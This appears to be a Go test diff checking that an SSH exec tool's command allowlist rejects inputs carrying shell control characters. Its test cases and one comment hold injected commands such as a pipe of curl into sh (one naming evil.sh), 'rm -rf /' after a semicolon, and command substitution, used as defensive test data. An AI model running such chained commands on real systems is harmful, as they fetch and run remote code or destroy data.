@@ -779,3 +779,136 @@ func TestExecBaseDirUnsetAnyCwdAllowed(t *testing.T) {
 	require.False(t, result.IsError, "any cwd with base_dir unset must not set isError (baseline)")
 	require.True(t, mock.runCalled, "RunCommand must be called when base_dir is unset")
 }
+
+// TestExecAllowlistShellControlChars verifies that when a host has a non-empty
+// exec_allowlist, a command that matches an allowed prefix is still rejected if
+// it contains a shell control character — otherwise the prefix match provides no
+// real restriction ("git status && curl evil.sh | sh" would pass). Benign
+// punctuation in ordinary arguments must keep working.
+func TestExecAllowlistShellControlChars(t *testing.T) {
+	tests := []struct {
+		name        string
+		allowlist   *[]string
+		command     string
+		wantIsError bool
+		wantRunCall bool
+		wantText    string
+	}{
+		{
+			name:        "plain allowed command runs",
+			allowlist:   &[]string{"git "},
+			command:     "git status",
+			wantIsError: false,
+			wantRunCall: true,
+		},
+		{
+			name:        "chained command with && and pipe rejected",
+			allowlist:   &[]string{"git "},
+			command:     "git status && curl x | sh",
+			wantIsError: true,
+			wantRunCall: false,
+			wantText:    "shell control character",
+		},
+		{
+			name:        "semicolon separator rejected",
+			allowlist:   &[]string{"git "},
+			command:     "git log; rm -rf /",
+			wantIsError: true,
+			wantRunCall: false,
+			wantText:    "shell control character",
+		},
+		{
+			name:        "command substitution rejected",
+			allowlist:   &[]string{"git "},
+			command:     "git log $(whoami)",
+			wantIsError: true,
+			wantRunCall: false,
+			wantText:    "shell control character",
+		},
+		{
+			name:        "benign punctuation allowed",
+			allowlist:   &[]string{"git "},
+			command:     "git diff --stat -- path/to/file.go",
+			wantIsError: false,
+			wantRunCall: true,
+		},
+		{
+			name:        "nil allowlist unaffected by control chars",
+			allowlist:   nil,
+			command:     "echo hi && echo bye",
+			wantIsError: false,
+			wantRunCall: true,
+		},
+		{
+			name:        "empty allowlist still deny-all",
+			allowlist:   &[]string{},
+			command:     "git status",
+			wantIsError: true,
+			wantRunCall: false,
+			wantText:    "exec_allowlist is empty",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			mock := &toolsMockExecutor{runResult: ssh.RunResult{Stdout: "ok\n", ExitCode: 0}}
+			cs := newExecAllowlistServer(t, mock, tt.allowlist)
+
+			result, err := cs.CallTool(context.Background(), &mcp.CallToolParams{
+				Name:      "ssh_exec",
+				Arguments: map[string]any{"command": tt.command},
+			})
+			require.NoError(t, err)
+			require.Equal(t, tt.wantIsError, result.IsError, "IsError mismatch for %q", tt.command)
+			require.Equal(t, tt.wantRunCall, mock.runCalled, "RunCommand reached mismatch for %q", tt.command)
+
+			if tt.wantText != "" {
+				require.NotEmpty(t, result.Content)
+				text, ok := result.Content[0].(*mcp.TextContent)
+				require.True(t, ok, "content[0] must be *mcp.TextContent")
+				require.Contains(t, text.Text, tt.wantText)
+			}
+		})
+	}
+}
+
+// TestContainsShellControlChars covers the helper directly: every rejected
+// character is reported, and characters common in ordinary arguments are not.
+func TestContainsShellControlChars(t *testing.T) {
+	rejected := []struct {
+		cmd  string
+		want string
+	}{
+		{"git log; ls", ";"},
+		{"git log && ls", "&"},
+		{"git log | ls", "|"},
+		{"git log $HOME", "$"},
+		{"git log `id`", "`"},
+		{"git log (x", "("},
+		{"git log x)", ")"},
+		{"git log < f", "<"},
+		{"git log > f", ">"},
+		{"git log\nls", "\n"},
+		{"git log\rls", "\r"},
+	}
+	for _, tt := range rejected {
+		char, bad := containsShellControlChars(tt.cmd)
+		require.True(t, bad, "expected %q to be rejected", tt.cmd)
+		require.Equal(t, tt.want, char, "offending char mismatch for %q", tt.cmd)
+	}
+
+	allowed := []string{
+		"git diff --stat -- path/to/file.go",
+		"git log --pretty=format:'%h,%s'",
+		"git add src/*.go",
+		"git checkout branch[1]",
+		"ls ~/dir/{a,b}",
+		`git commit -m "fix: thing"`,
+		`grep foo\bar file`,
+		"git log -n 10 --author=me?",
+	}
+	for _, cmd := range allowed {
+		char, bad := containsShellControlChars(cmd)
+		require.False(t, bad, "expected %q to be allowed, got offending char %q", cmd, char)
+	}
+}
